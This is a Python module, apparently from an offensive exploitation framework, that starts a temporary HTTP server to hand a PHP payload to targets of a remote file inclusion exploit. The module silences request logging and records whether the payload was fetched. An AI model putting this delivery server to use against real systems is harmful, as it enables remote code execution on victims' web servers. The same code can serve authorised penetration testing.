"""
HWP RFI Server — Temporary HTTP server for RFI exploit delivery.

When an RFI exploit is paired with an AFU-only payload, the framework
spins up a temporary HTTP server to serve the payload content, then
provides the URL to the exploit.

Usage (by chain.py):
    server = RFIServer(content, lhost, lport)
    url = server.start()     # Returns http://lhost:lport/payload.php
    # ... exploit uses URL ...
    server.stop()
"""

import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from lib import output


class _PayloadHandler(BaseHTTPRequestHandler):
    """Serves a single payload file, then signals completion."""

    payload_content = b""
    payload_filename = "payload.php"
    served = False

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(self.payload_content)))
        self.end_headers()
        self.wfile.write(self.payload_content)
        _PayloadHandler.served = True

    def log_message(self, format, *args):
        # Suppress default HTTP server logging
        pass


class RFIServer:
    """Temporary HTTP server that serves payload content for RFI exploits."""

    def __init__(self, content, lhost, lport, filename="payload.php"):
        self.content = content.encode("utf-8") if isinstance(content, str) else content
        self.lhost = lhost
        self.lport = int(lport)
        self.filename = filename
        self._server = None
        self._thread = None

    def start(self) -> str:
        """Start the server in a background thread. Returns the payload URL."""
        _PayloadHandler.payload_content = self.content
        _PayloadHandler.payload_filename = self.filename
        _PayloadHandler.served = False

        try:
            self._server = HTTPServer(("0.0.0.0", self.lport), _PayloadHandler)
        except OSError as e:
            output.error(f"Failed to start RFI server on port {self.lport}: {e}")
            return ""

        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

        url = f"http://{self.lhost}:{self.lport}/{self.filename}"
        output.info(f"RFI server listening on 0.0.0.0:{self.lport}")
        output.info(f"Serving payload at: {url}")
        return url

    def stop(self):
        """Shut down the server."""
        if self._server:
            self._server.shutdown()
            self._thread.join(timeout=5)
            self._server = None
            self._thread = None

    @property
    def was_fetched(self) -> bool:
        """True if the payload was served at least once."""
        return _PayloadHandler.served
